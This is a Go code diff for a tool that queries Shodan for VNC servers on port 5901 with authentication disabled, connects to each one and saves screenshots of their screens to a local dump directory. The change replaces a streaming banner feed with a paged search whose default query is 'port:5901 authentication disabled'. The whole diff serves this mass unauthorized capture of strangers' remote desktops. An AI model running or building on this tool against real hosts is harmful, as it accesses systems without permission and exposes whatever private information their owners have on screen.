@@ -76,6 +76,8 @@ func screenCapture(host string, port int, filename string) (err error) {
 func main() {
 	dumpdir := flag.String("dumpdir", "/tmp/vncdumps", "screenshots will be dumped to this directory")
 	logfile := flag.String("logfile", "slideshow.log", "logfile location")
+	query := flag.String("query", "port:5901 authentication disabled", "shodan query")
+	pages := flag.Int("pages", 1, "result pages to retrieve")
 	flag.Parse()
 
 	f, err := os.OpenFile(*logfile, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
@@ -85,16 +87,6 @@ func main() {
 	defer f.Close()
 	log.SetOutput(f)
 
-	client := shodan.NewEnvClient(nil)
-
-	ports := []int{5901}
-	chBanner := make(chan *shodan.HostData)
-	err = client.GetBannersByPorts(context.Background(), ports, chBanner)
-
-	if err != nil {
-		log.Panic(err)
-	}
-
 	if _, err = os.Stat(*dumpdir); os.IsNotExist(err) {
 		err = os.Mkdir(*dumpdir, 0755)
 	}
@@ -102,19 +94,30 @@ func main() {
 		log.Panic(err)
 	}
 
-	for {
-		banner, ok := <-chBanner
-		if !ok {
-			log.Fatalln("channel closed")
+	client := shodan.NewEnvClient(nil)
+
+	for page := 0; page < *pages; page++ {
+		queryOptions := &shodan.HostQueryOptions{
+			Query: *query,
+			Page:  page,
 		}
-		ip := banner.IP.String()
-		imgname := fmt.Sprintf("%d_%s.png", time.Now().UnixNano(), ip)
-		filepath := path.Join(*dumpdir, imgname)
-		err = screenCapture(ip, 5901, filepath)
+
+		hosts, err := client.GetHostsForQuery(context.Background(), queryOptions)
+
 		if err != nil {
-			log.Printf("ERROR: %s %v", ip, err)
-			continue
+			log.Panic(err)
 		}
-		log.Printf("INFO: dumped VNC screenshot from host %s to %s", ip, filepath)
+
+		for _, host := range hosts.Matches {
+			ip := host.IP.String()
+			imgname := fmt.Sprintf("%d_%s.png", time.Now().UnixNano(), ip)
+			filepath := path.Join(*dumpdir, imgname)
+			err = screenCapture(ip, 5901, filepath)
+			if err != nil {
+				log.Printf("ERROR: %s %v", ip, err)
+				continue
+			}
+			log.Printf("INFO: dumped VNC screenshot from host %s to %s", ip, filepath)
+		}
 	}
 }
